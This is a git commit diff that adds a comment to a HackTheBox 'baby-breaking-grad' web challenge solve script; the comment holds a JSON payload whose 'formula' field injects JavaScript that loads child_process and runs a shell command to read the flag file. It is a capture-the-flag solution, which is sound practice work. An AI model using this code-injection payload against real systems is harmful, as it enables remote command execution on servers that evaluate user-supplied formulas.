1c3c1d32092a587129aa66ab431dfbfba4132a6c
dillon wu <dillonwu999@gmail.com>
2023-09-23 23:54:17 -0400

    solve file added

--- hackthebox/challenges/web/baby-breaking-grad/solve.js
+++ hackthebox/challenges/web/baby-breaking-grad/solve.js
@@ -7,3 +7,10 @@ let ast = parse(src).body[0].expression
 let weight = evaluate(ast, {})
 console.log(ast)
 console.log(weight)
+
+/*
+ * Payload:
+ * {"name":"Kenny Bakr",
+ *  "formula":"(function(x){return `${eval(\"throw new TypeError(global.process.mainModule.constructor._load('child_process').execSync('cat flagKntmG').toString())\")}`})()"
+ * }
+ */
